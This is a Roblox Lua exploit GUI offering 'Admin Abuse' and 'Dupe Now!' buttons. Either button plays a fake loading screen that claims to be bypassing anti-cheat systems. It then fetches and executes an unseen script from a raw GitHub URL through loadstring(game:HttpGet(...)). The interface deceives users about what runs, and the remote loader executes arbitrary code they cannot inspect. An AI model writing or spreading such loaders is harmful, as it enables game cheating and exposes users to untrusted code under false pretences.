-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local layout = Instance.new("UIListLayout", mainFrame)
layout.Padding = UDim.new(0, 10)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- Loading Screen with percent and progress bar
local function createFullscreenLoading(message)
	local screen = Instance.new("ScreenGui", playerGui)
	screen.Name = "FullLoadingScreen"
	screen.ResetOnSpawn = false
	screen.IgnoreGuiInset = true
	screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local frame = Instance.new("Frame", screen)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.ZIndex = 10

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 0.2, 0)
	label.Position = UDim2.new(0.5, 0, 0.4, 0)
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.Text = message
	label.Font = Enum.Font.Cartoon
	label.TextSize = 36
	label.TextColor3 = Color3.new(1, 1, 1)
	label.BackgroundTransparency = 1
	label.ZIndex = 11

	local percent = Instance.new("TextLabel", frame)
	percent.Size = UDim2.new(0, 200, 0, 40)
	percent.Position = UDim2.new(0.5, 0, 0.55, 0)
	percent.AnchorPoint = Vector2.new(0.5, 0.5)
	percent.Text = "0%"
	percent.Font = Enum.Font.Cartoon
	percent.TextSize = 30
	percent.TextColor3 = Color3.new(1, 1, 1)
	percent.BackgroundTransparency = 1
	percent.ZIndex = 11

	local progressBarBg = Instance.new("Frame", frame)
	progressBarBg.Size = UDim2.new(0.4, 0, 0, 10)
	progressBarBg.Position = UDim2.new(0.5, 0, 0.62, 0)
	progressBarBg.AnchorPoint = Vector2.new(0.5, 0.5)
	progressBarBg.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	progressBarBg.ZIndex = 11
	Instance.new("UICorner", progressBarBg).CornerRadius = UDim.new(0, 5)

	local progressBar = Instance.new("Frame", progressBarBg)
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	progressBar.ZIndex = 12
	Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 5)

	task.spawn(function()
		for i = 0, 100 do
			local tween = TweenService:Create(progressBar, TweenInfo.new(0.025, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(i / 100, 0, 1, 0)
			})
			tween:Play()
			percent.Text = i .. "%"
			wait(0.025)
		end

		-- Fade out
		local fadeOutInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService:Create(frame, fadeOutInfo, {BackgroundTransparency = 1}):Play()
		TweenService:Create(label, fadeOutInfo, {TextTransparency = 1}):Play()
		TweenService:Create(percent, fadeOutInfo, {TextTransparency = 1}):Play()
		TweenService:Create(progressBar, fadeOutInfo, {BackgroundTransparency = 1}):Play()
		TweenService:Create(progressBarBg, fadeOutInfo, {BackgroundTransparency = 1}):Play()
		task.wait(1.1)
		screen:Destroy()
	end)

	return screen
end

-- Button creation
local function createButton(name)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Cartoon
	btn.TextSize = 24
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	btn.AutoButtonColor = true
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
	return btn
end

-- Click logic
local function onButtonClick(clickedButton, loadingMessage)
	local originalText = clickedButton.Text
	clickedButton.Text = ""

	-- Animate click
	local clickTween = TweenService:Create(clickedButton, TweenInfo.new(0.1), {
		Size = clickedButton.Size - UDim2.new(0, 5, 0, 5)
	})
	clickTween:Play()
	clickTween.Completed:Wait()

	local restoreTween = TweenService:Create(clickedButton, TweenInfo.new(0.1), {
		Size = UDim2.new(0.8, 0, 0, 40)
	})
	restoreTween:Play()

	-- Hide other buttons
	for _, child in pairs(mainFrame:GetChildren()) do
		if child:IsA("TextButton") and child ~= clickedButton then
			child.Visible = false
		end
	end

	-- Shrink frame
	local shrinkTween = TweenService:Create(mainFrame, TweenInfo.new(0.4), {
		Size = UDim2.new(0, 0, 0, 0),
		Position = UDim2.new(0.5, 0, 0.5, 0)
	})
	shrinkTween:Play()
	shrinkTween.Completed:Wait()
	mainGui.Enabled = false

	-- Show fullscreen loading
	local screen = createFullscreenLoading(loadingMessage)

	task.delay(2.6, function()
		-- Execute external script AFTER loading screen
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
		end)
	end)
end

-- Buttons
local adminButton = createButton("Admin Abuse")
adminButton.MouseButton1Click:Connect(function()
	onButtonClick(adminButton, "Bypassing Command Panel, Please Wait.")
end)

local dupeButton = createButton("Dupe Now!")
dupeButton.MouseButton1Click:Connect(function()
	onButtonClick(dupeButton, "Bypassing Duping Anti-Cheat, Please Wait.")
end)
